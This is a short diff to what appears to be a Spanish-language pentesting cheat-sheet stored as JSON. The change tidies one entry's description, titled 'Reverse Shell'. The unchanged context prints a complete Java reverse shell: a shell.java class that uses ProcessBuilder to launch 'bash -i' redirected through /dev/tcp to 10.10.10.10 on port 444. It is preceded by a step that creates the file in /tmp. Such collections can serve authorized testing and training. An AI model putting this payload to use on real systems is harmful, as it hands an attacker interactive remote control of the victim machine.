@@ -6068,7 +6068,7 @@
             "code": "cd /tmp/\ntouch shell.java"
           },
           {
-            "description": "Contenido de shell.java - Reverse Shell fsdf sd",
+            "description": "Contenido de shell.java - Reverse Shell",
             "code": "public class shell {\n    public static void main(String[] args) {\n        ProcessBuilder pb = new ProcessBuilder(\"bash\", \"-c\", \"$@| bash -i >& /dev/tcp/10.10.10.10/444 0>&1\")\n            .redirectErrorStream(true);\n        try {\n            Process p = pb.start();\n            p.waitFor();\n            p.destroy();\n        } catch (Exception e) {}\n    }\n}"
           },
           {
